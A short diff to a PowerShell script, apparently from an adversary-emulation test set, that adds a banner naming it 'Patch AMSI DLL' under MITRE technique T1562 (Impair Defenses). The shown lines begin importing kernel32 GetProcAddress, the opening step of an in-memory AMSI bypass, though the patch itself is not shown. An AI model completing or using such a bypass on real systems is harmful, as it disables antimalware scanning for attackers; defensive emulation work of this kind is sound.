@@ -1,3 +1,12 @@
+# Impair Defenses
+# Technic ID : T1562
+Clear-Host
+Write-Output "==============================================================================="
+Write-Output "Patch AMSI DLL : Impair Defenses (T1562)"
+
+Write-Output "==============================================================================="
+#
+
 $Kernel32 = Add-Type -MemberDefinition @"
     [DllImport("kernel32.dll", SetLastError = true)]
     public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
